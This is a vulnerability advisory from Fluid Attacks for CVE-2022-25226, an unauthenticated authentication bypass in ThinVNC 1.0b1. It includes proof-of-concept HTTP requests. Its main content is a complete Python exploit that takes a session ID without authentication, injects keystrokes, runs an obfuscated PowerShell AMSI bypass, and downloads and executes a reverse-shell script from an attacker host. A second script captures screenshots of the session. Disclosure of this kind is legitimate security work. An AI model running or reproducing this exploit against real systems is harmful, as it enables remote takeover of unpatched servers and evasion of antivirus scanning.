---
slug: advisories/sinatra/
title: ThinVNC 1.0b1 - Authentication Bypass
authors: Oscar Uribe
writer: ouribe
codename: sinatra
product: ThinVNC 1.0b1
date: 2022-04-06 10:00 COT
cveid: CVE-2022-25226
severity: 10.0
description: ThinVNC version 1.0b1 - Authentication Bypass to RCE
keywords: Fluid Attacks, Security, Vulnerabilities, VNC, Auth Bypass
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                        |
| --------------------- | ------------------------------------------------------ |
| **Name**              | ThinVNC 1.0b1 - Authentication Bypass                  |
| **Code name**         | [Sinatra](https://en.wikipedia.org/wiki/Frank_Sinatra) |
| **Product**           | ThinVNC                                                |
| **Affected versions** | Version 1.0b1                                          |
| **State**             | Public                                                 |
| **Release date**      | 2022-04-13                                             |

## Vulnerability

|                       |                                                                                                                |
| --------------------- | -------------------------------------------------------------------------------------------------------------- |
| **Kind**              | Authentication Bypass                                                                                          |
| **Rule**              | [006. Authentication mechanism absence or evasion](https://docs.fluidattacks.com/criteria/vulnerabilities/006) |
| **Remote**            | Yes                                                                                                            |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H                                                                   |
| **CVSSv3 Base Score** | 10.0                                                                                                           |
| **Exploit available** | Yes                                                                                                            |
| **CVE ID(s)**         | [CVE-2022-25226](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25226)                                |

## Description

ThinVNC version **1.0b1**  allows an unauthenticated user
to bypass the authentication process via
`http://thin-vnc:8080/cmd?cmd=connect` by obtaining a valid `SID`
without any kind of authentication. It is possible to achieve
code execution on the server by sending keyboard or mouse
events to the server.

## Proof of Concept

1. Send the following request to the application in order to obtain a valid `SID`.

    ```http
    GET /cmd?cmd=connect&destAddr=poc&id=0 HTTP/1.1
    Host: 172.16.28.140:8081
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0
    Accept-Language: en-US,en;q=0.5
    X-Requested-With: XMLHttpRequest
    Referer: http://172.16.28.140:8081/
    Cookie: SID=
    ```

2. Obtain the `SID` from the server response and add it to
   the following request in order to validate the `SID`

    ```http
    GET /cmd?cmd=start&mouseControl=true&kbdControl=true&quality=85&pixelFormat=0&monitor=0&id=[SID] HTTP/1.1
    Host: 172.16.28.140:8081
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0
    Accept-Language: en-US,en;q=0.5
    X-Requested-With: XMLHttpRequest
    Referer: http://172.16.28.140:8081/
    Cookie: SID=[SID]
    ```

3. Now it is possible to send keystrokes or mouse
   moves to the server using the validated `SID`

## Exploit

The following exploit can be used to obtain a reverse shell
on the server running the ThinVNC application.

```python
import requests
import time
import argparse


proxies = {'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "close",
}

def login_sid(base_url):
    url = base_url + "/cmd?cmd=connect&destAddr=poc&id=0"
    cookies = {"SID": ""}
    r = requests.get(url, headers=headers, cookies=cookies, proxies=proxies)
    #r = requests.get(url, headers=headers, cookies=cookies)

    return r.json()['id']


def start_sid(base_url, sid):

    url = base_url + "/cmd?cmd=start&mouseControl=true&kbdControl=true&quality=85&pixelFormat=0&monitor=0&id=%s" % sid
    cookies = {"SID": "%s" % sid}
    r = requests.get(url, headers=headers, cookies=cookies, proxies=proxies)
    #r = requests.get(url, headers=headers, cookies=cookies)
    time.sleep(2)


def send_ctrl_esc(base_url, sid):

    url = base_url + "/cmd?cmd=fkey&key=CtrlEsc&id=%s" % sid
    cookies = {"SID": "%s" % sid}
    requests.get(url, headers=headers, cookies=cookies, proxies=proxies)
    #requests.get(url, headers=headers, cookies=cookies)
    time.sleep(2)


def send_text(base_url, sid, text):

    url = base_url + "/cmd?id=%s&cmd=cli&type=clipboard&action=paste" % sid
    cookies = {"SID": "%s" % sid}
    data = text
    requests.post(url, headers=headers, cookies=cookies, proxies=proxies, data=data)
    #requests.post(url, headers=headers, cookies=cookies, data=data)
    time.sleep(2)

def send_enter(base_url, sid):

    url = base_url + "/cmd?cmd=keyb&key=13&char=0&action=down&id=%s" % sid
    cookies = {"SID": "%s" % sid}
    requests.get(url, headers=headers, cookies=cookies, proxies=proxies)
    #requests.get(url, headers=headers, cookies=cookies)
    time.sleep(2)



parser = argparse.ArgumentParser(description='ThinVNC exploit')

parser.add_argument('-s', '--server-ip', required=True, help='ThinVNC IP')
parser.add_argument('-p', '--server-port', required=True, help='ThinVNC PORT')

parser.add_argument('-r', '--reverse-ip', required=True, help='Reverse Shell IP')
parser.add_argument('-a', '--reverse-port', required=True, help='Reverse Shell PORT')

args = parser.parse_args()


url = 'http://%s:%s' % (args.server_ip,args.server_port)


print("[*] ThinVNC Auth Bypass to RCE exploit")
print

print("[+] Getting sid")
sid = login_sid(url)

print("[+] Initializing sid")
start_sid(url, sid)


print("[+] Sending Ctrl+Esc sid")
send_ctrl_esc(url, sid)

print("[+] Opening run")
send_text(url, sid, "run")
send_enter(url, sid)


print("[+] Sending Reverse Shell")

amsi_txt = """powershell.exe -exec bypass"""
send_text(url, sid, amsi_txt)
send_enter(url, sid)


# AMSI Bypass
amsi_txt = """S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )"""
send_text(url, sid, amsi_txt)
send_enter(url, sid)


# Reverse Shell
rev_shell_txt = "IEX((New-Object System.Net.WebClient).DownloadString('http://<attacker>:8002/rev.ps1'))"
send_text(url, sid, rev_shell_txt)
send_enter(url, sid)
```

The following code can be used to take screenshots of the VNC session.

```python
import requests
import time
import argparse
import os
import urllib3
urllib3.disable_warnings()


proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "close",
    "Referer": "http://172.16.28.140:8081/"
}

def login_sid(base_url):
    url = base_url + "/cmd?cmd=connect&destAddr=poc&id=0"
    cookies = {"SID": ""}
    r = requests.get(url, headers=headers, cookies=cookies, proxies=proxies, verify=False)
    #r = requests.get(url, headers=headers, cookies=cookies, verify=False)

    return r.json()['id']


def start_sid(base_url, sid):

    url = base_url + "/cmd?cmd=start&mouseControl=true&kbdControl=true&quality=85&pixelFormat=0&monitor=0&id=%s" % sid
    cookies = {"SID": "%s" % sid}
    r = requests.get(url, headers=headers, cookies=cookies, proxies=proxies, verify=False)
    #r = requests.get(url, headers=headers, cookies=cookies, verify=False)
    time.sleep(1)


def send_ctrl_esc(base_url, sid):

    url = base_url + "/cmd?cmd=fkey&key=CtrlEsc&id=%s" % sid
    cookies = {"SID": "%s" % sid}
    requests.get(url, headers=headers, cookies=cookies, proxies=proxies, verify=False)
    #requests.get(url, headers=headers, cookies=cookies, verify=False)
    time.sleep(1)


def get_images(base_url, sid):

    os.system("rm images/*.jpg")

    x = 0

    url = base_url + "/json?id=%s" % sid
    cookies = {"SID": "%s" % sid}

    r = requests.get(url, headers=headers, cookies=cookies, proxies=proxies, verify=False)
    #r = requests.get(url, headers=headers, cookies=cookies, verify=False)

    windows = r.json()['windows']


    for w in windows:

        if "imgs" in w:
            for img in w["imgs"]:
                x += 1

                str_image = img["img"].replace("data:image/jpeg;base64,","")

                name_txt = 'images/%s.txt' % str(x)

                name_png = 'images/%s.jpg' % str(x)

                f = open(name_txt,'w')
                f.write(str_image)
                f.close()

                try:
                    os.system("cat %s | base64 -d > %s; rm %s" % (name_txt, name_png, name_txt))
                except:
                    print("[*] Error Decoding Images")


parser = argparse.ArgumentParser(description='ThinVNC exploit')

parser.add_argument('-s', '--server-ip', required=True, help='ThinVNC IP')
parser.add_argument('-p', '--server-port', required=True, help='ThinVNC PORT')
parser.add_argument('-k', '--ssl',required=True, help='ssl (true or false)')


args = parser.parse_args()

if (args.ssl.lower() == "true"):
    url = 'https://%s:%s' % (args.server_ip,args.server_port)
else:
    url = 'http://%s:%s' % (args.server_ip,args.server_port)


print("[*] ThinVNC Auth Bypass - VNC Session Images")
print

print("[+] Getting sid")
sid = login_sid(url)

print("[+] Initializing sid")
start_sid(url, sid)


get_images(url, sid)
```

## Mitigation

By 2022-04-13 there is not a patch resolving the issue.

## Credits

The vulnerability was discovered by [Oscar
Uribe](https://co.linkedin.com/in/oscar-uribe-londo%C3%B1o-0b6534155) from the Offensive
Team of Fluid Attacks.

## References

**Vendor page** <https://github.com/bewest/thinvnc>

**Issue** <https://github.com/bewest/thinvnc/issues/7>

## Timeline

<time-lapse
  discovered="2022-04-05"
  contacted="2022-04-05"
  replied=""
  confirmed=""
  patched=""
  disclosure="2022-04-13">
</time-lapse>
